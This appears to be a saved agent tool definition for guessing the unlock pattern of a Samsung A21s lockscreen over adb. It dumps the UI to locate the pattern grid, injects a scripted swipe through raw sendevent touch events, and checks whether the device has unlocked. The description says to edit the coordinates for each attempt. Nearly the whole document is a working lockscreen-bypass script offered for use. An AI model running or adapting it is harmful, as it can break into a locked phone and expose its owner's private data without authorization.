name: a21s_pattern_strike
description: Pattern attempt on A21s lockscreen: expand bouncer, dump lockPatternView bounds, compute 3x3 node centers, fire a multi-segment sendevent chain on /dev/input/event3 (1:1 mapping 720x1600). Takes codes as list of [col,row] e.g. [[0,0],[1,0],[2,0],[2,1],[2,2]]. Edit the coordinates line per attempt.

args.command: input keyevent 82; sleep 1; uiautomator dump /sdcard/wd.xml >/dev/null 2>&1; tr '<' '\n<' < /sdcard/wd.xml | grep -oE 'lockPatternView"[^>]*bounds="\[[0-9]+,[0-9]+\]\[[0-9]+,[0-9]+\]"'

E=/dev/input/event3; sendevent $E 3 57 1000; sendevent $E 3 53 211; sendevent $E 3 54 1011; sendevent $E 1 330 1; sendevent $E 0 0 0; sendevent $E 3 53 211; sendevent $E 3 54 1160; sendevent $E 0 0 0; sendevent $E 3 53 211; sendevent $E 3 54 1309; sendevent $E 0 0 0; sendevent $E 3 53 360; sendevent $E 3 54 1309; sendevent $E 0 0 0; sendevent $E 3 53 509; sendevent $E 3 54 1309; sendevent $E 0 0 0; sendevent $E 1 330 0; sendevent $E 3 57 -1; sendevent $E 0 0 0; sleep 2; dumpsys trust | grep -o 'deviceLocked=[0-9]'
